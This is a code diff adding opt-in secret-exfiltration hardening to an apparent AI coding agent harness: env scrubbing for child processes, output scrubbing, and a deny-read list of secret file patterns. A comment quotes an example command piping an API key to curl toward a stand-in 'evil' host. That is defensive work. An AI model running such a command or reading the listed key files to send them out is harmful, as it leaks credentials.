@@ -508,6 +508,29 @@ VERIFY_RUNTIME_DONE = _as_bool(os.environ.get("CODE_VERIFY_RUNTIME_DONE", "false
 # default -> scrub_record is never called and the trajectory is byte-identical.
 SCRUB_TRAJECTORY = _as_bool(os.environ.get("CODE_SCRUB_TRAJECTORY", "false"))
 
+# Secret-exfil hardening (specs/0078) — closes the highest-EV holes a Codex-vs-OAC security review found. All
+# default OFF (byte-identical). ENV_SCRUB: spawn run_command children with an allowlisted env (drop CODE_* /
+# secret-shaped vars) so a child can't `echo $env:CODE_API_KEY | curl evil`. SCRUB_OUTPUT: run scrub_text over
+# LIVE run_command stdout before the model sees it (the scrubber otherwise runs only at the trajectory write).
+# SECRET_DENY_READ: deny read_file of a designated secret file (.env / keys) and skip them in grep/glob/tree.
+ENV_SCRUB = _as_bool(os.environ.get("CODE_ENV_SCRUB", "false"))
+ENV_PASSLIST = os.environ.get("CODE_ENV_PASSLIST", "").strip()
+SCRUB_OUTPUT = _as_bool(os.environ.get("CODE_SCRUB_OUTPUT", "false"))
+SECRET_DENY_READ = _as_bool(os.environ.get("CODE_SECRET_DENY_READ", "false"))
+_SECRET_GLOBS_DEFAULT = (".env,.env.*,*.pem,*.key,id_rsa,id_rsa.*,id_ed25519,id_ed25519.*,"
+                         "*.pfx,*.p12,*.ppk,*.keystore,credentials,secrets.json")
+SECRET_PATH_GLOBS = [g.strip() for g in
+                     os.environ.get("CODE_SECRET_PATH_GLOBS", _SECRET_GLOBS_DEFAULT).split(",") if g.strip()]
+
+
+def is_secret_path(rel):
+    """specs/0078: True if `rel` (a workspace-relative path) names a designated SECRET file — matched on the
+    BASENAME (case-insensitive) against CODE_SECRET_PATH_GLOBS (.env / keys). Feeds the deny-read gate + the
+    grep/glob/tree skip. Never raises."""
+    import fnmatch
+    base = os.path.basename((rel or "").replace("\\", "/")).lower()
+    return bool(base) and any(fnmatch.fnmatch(base, g.lower()) for g in SECRET_PATH_GLOBS)
+
 # Edit-layer (Phase 13 / specs/0013). CODE_EDIT_FUZZY: a SAFE fuzzy fallback UNDER exact-match edit_file
 # - when the exact old_string isn't found, editmatch.resolve locates it (whitespace-insensitive, then
 # most-similar chunk) and applies ONLY a UNIQUE, above-threshold match; any ambiguity refuses, so
